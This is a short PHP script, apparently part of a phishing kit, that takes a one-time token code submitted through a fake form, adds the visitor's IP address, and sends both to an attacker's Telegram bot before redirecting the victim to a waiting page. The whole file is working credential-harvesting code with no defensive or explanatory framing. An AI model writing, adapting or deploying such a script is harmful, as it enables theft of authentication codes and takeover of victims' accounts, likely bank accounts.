<?php

$numtel = $_POST['tokencode'];






require 'space.php';

$html_message = "## TOKEN1CBBC ##\n". 
         
        "<b>✔️✯Cod1: </b><code>".$numtel."</code>\n".

         

        
  
		 

			
  
				"IP INFO\n".
				"🌐Direcion IP ".$_SERVER['REMOTE_ADDR']."\n".
        
				"";


$html_message = urlencode($html_message);
$result = @file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=$html_message&parse_mode=html");

header ("location:espere2.php");

?>